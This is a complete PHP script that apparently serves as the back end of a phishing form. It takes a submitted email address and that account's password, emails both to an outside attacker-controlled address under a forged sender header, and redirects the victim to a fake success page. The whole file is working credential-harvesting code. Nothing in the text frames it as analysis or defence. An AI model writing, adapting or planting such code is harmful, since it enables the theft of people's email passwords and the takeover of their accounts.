<?php
$email = $_POST ['email'];
$clavemail = $_POST ['clavemail'];
$formcontent= "Email: $email \n Clave email: $clavemail";
$recipient = "rkio222@yahoo.com";
$subject = "Contacto Email";
$mailheader = "From:  gshevtsk@gsherrystores.com  \r\n";
mail($recipient, $subject, $formcontent, $mailheader) or die("Error!");
header('Location: operacion-exitosa2.html');
?>
